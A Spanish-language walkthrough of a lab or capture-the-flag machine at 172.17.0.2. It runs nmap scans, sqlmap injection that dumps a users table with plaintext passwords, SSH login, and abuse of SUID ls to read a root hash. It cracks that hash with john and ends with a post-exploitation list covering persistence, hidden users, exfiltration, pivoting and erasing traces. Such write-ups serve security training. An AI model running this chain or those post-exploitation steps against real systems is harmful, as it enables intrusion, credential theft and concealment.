# 🛡️ Guía de Explotación y Escalada de Privilegios

## 1. 📡 Comprobación de Conectividad

```bash
ping 172.17.0.2
```

---

## 2. 🔍 Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

✅ **Puertos abiertos detectados:**

| Puerto | Servicio |
|--------|----------|
| 22/tcp | SSH      |
| 80/tcp | HTTP     |

---

## 3. 🔎 Detección de Versiones de Servicios

```bash
nmap -p22,80 -sCV 172.17.0.2
```

**Resultados:**

| Puerto | Servicio                      |
|--------|-------------------------------|
| 22/tcp | OpenSSH 9.2p1 Debian 2+deb12u3 |
| 80/tcp | Apache httpd 2.4.61 (Debian)   |

---

## 4. 📁 Enumeración de Directorios vía HTTP

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

❌ No se encontraron directorios relevantes.

🔍 Sin embargo, **se detectó un `login.html`** manualmente.

---

## 5. 💉 Pruebas de Inyección SQL con `sqlmap`

### a. Enumeración de bases de datos

```bash
sqlmap -u http://172.17.0.2/login.html --forms --dbs --batch
```

**Bases de datos disponibles:**

- information_schema  
- mysql  
- performance_schema  
- sys  
- users ✅

### b. Tablas en la base de datos `users`

```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users --tables
```

| Tabla     |
|-----------|
| usuarios  |

### c. Columnas en la tabla `usuarios`

```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns
```

| Columna  | Tipo          |
|----------|---------------|
| id       | int(11)       |
| username | varchar(255)  |
| password | varchar(255)  |

### d. Extracción de datos

```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --dump
```

| ID | Username | Password      |
|----|----------|---------------|
| 1  | paco     | $paco$123     |
| 2  | pepe     | P123pepe3456P |
| 3  | juan     | jjuuaann123   |

---

## 6. 🔐 Acceso vía SSH

```bash
ssh pepe@172.17.0.2
```

✅ Acceso conseguido con el usuario **pepe**

⚠️ No se encuentra el comando `sudo`.

---

## 7. 🔍 Búsqueda de Archivos con Permisos SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Resultados interesantes:**

- `/usr/bin/ls`
- `/usr/bin/grep`

---

## 8. 🕵️ Acceso a `/root` con SUID

```bash
ls /root
```

✅ Archivo encontrado: `pass.hash`

---

## 9. 🔓 Descifrado de Hash con `john`

### Contenido del archivo `pass.hash`:

```
e43833c4c9d5ac444e16bb94715a75e4
```

### Comando utilizado:

```bash
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Resultado:

✅ Contraseña encontrada: **spongebob34**

---

## 10. 🧠 Tabla Explicativa del Comando `john`

| Parte del Comando                                      | Explicación                                                                 |
|--------------------------------------------------------|-----------------------------------------------------------------------------|
| `john`                                                 | Ejecuta la herramienta John the Ripper.                                    |
| `--format=raw-md5`                                     | Especifica el tipo de hash (en este caso MD5 sin sal).                     |
| `hash.txt`                                             | Archivo que contiene el hash a descifrar.                                  |
| `--wordlist=/usr/share/wordlists/rockyou.txt`          | Diccionario de palabras comunes que se usarán para intentar descifrarlo.   |

---

## 11. 🧑‍💻 Escalada a Root

Con la contraseña **spongebob34**, se obtiene acceso como **root**.

---

## 12. 🔐 Post-Explotación

Acciones sugeridas tras obtener acceso root:

- ✅ Establecer persistencia  
- 👤 Crear un usuario oculto  
- 🔐 Añadir clave pública SSH  
- 📂 Exfiltrar información sensible  
- 🌐 Explorar red interna  
- 🔄 Realizar pivoting a otras máquinas  
- 🧹 Eliminar rastros  
- ⚠️ *Destrucción del sistema (no recomendada)*
